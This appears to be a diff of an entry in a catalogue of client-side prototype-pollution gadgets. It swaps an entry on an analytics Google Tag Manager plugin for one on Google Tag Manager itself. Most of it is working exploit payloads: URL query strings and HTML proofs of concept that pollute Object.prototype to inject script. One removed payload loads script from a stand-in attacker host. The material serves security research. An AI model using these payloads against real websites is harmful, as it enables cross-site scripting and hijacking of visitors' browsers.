@@ -2,65 +2,49 @@
 
 ### URL
 
-https://www.npmjs.com/package/@analytics/google-tag-manager <br />
-https://github.com/DavidWells/analytics/tree/87394ecd762454a54b515d243b07d9984de81059/packages/analytics-plugin-google-tag-manager
+https://tagmanager.google.com/
 
 ### JS Fingerprint
 
 ```js
-return (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined')
-```
-
-### Vulnerable code fragment
-
-https://unpkg.com/@analytics/google-tag-manager@0.5.0/dist/@analytics/google-tag-manager.min.js <br />
-https://github.com/DavidWells/analytics/blob/87394ecd762454a54b515d243b07d9984de81059/packages/analytics-plugin-google-tag-manager/src/browser.js
-
-```js
-initialize: function(e) {
-    var t = e.config,
-        a = t.containerId,
-        n = t.dataLayerName,
-        i = t.customScriptSrc,
-        c = t.preview,
-        u = t.auth;
-    if (!a) throw new Error("No google tag manager containerId defined");
-    if (c && !u) throw new Error("When enabling preview mode, both preview and auth parameters must be defined");
-    var g = i || "https://www.googletagmanager.com/gtm.js";
-    o(a) || (function(e, t, r, a, n) {
-        e[a] = e[a] || [], e[a].push({
-            "gtm.start": (new Date).getTime(),
-            event: "gtm.js"
-        });
-        var o = t.getElementsByTagName(r)[0],
-            i = t.createElement(r),
-            d = "dataLayer" != a ? "&l=" + a : "",
-            s = c ? "&gtm_preview=" + c + "&gtm_auth=" + u + "&gtm_cookies_win=x" : "";
-        i.async = !0, i.src = "".concat(g, "?id=") + n + d + s, o.parentNode.insertBefore(i, o)
-    }(window, document, "script", n, a), r = n, t.dataLayer = window[n])
-}
+return (typeof google_tag_manager !== 'undefined')
 ```
 
 ### PoC
 
+#### PoC #1 (Depends on the GMT tags used)
+
 ```
-?__proto__[customScriptSrc]=//attacker.tld/xss.js
+?__proto__[vtp_enableRecaptcha]=1&__proto__[srcdoc]=<script>alert(1)</script>
 ```
 
 ```html
-<script src="https://unpkg.com/analytics/dist/analytics.min.js"></script>
-<script src="https://unpkg.com/@analytics/google-tag-manager/dist/@analytics/google-tag-manager.min.js"></script>
 <script>
-    Object.prototype.customScriptSrc = '//attacker.tld/xss.js'
+    Object.prototype.vtp_enableRecaptcha = "1";
+    Object.prototype.srcdoc = "<script>alert(123)<\/script>";
 </script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-KXRTW3N');</script>
+```
+
+#### PoC #2 (Depends on the GMT tags used)
+
+**This gadget requires Arrays support**
+
+```
+?__proto__[q][0][0]=require&__proto__[q][0][1]=x&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7
+```
+
+```html
 <script>
-    var Analytics = _analytics.init({
-        app: 'my-app-name',
-        plugins: [
-          analyticsGtagManager({
-            containerId: 'GTM-123xyz'
-          })
-        ]
-    })
+    Object.prototype.q = [['require', 'x', 'https://www.google-analytics.com/gtm/js?id=GTM-WXTDWH7']];
 </script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-WFHQQ63');</script>
 ```
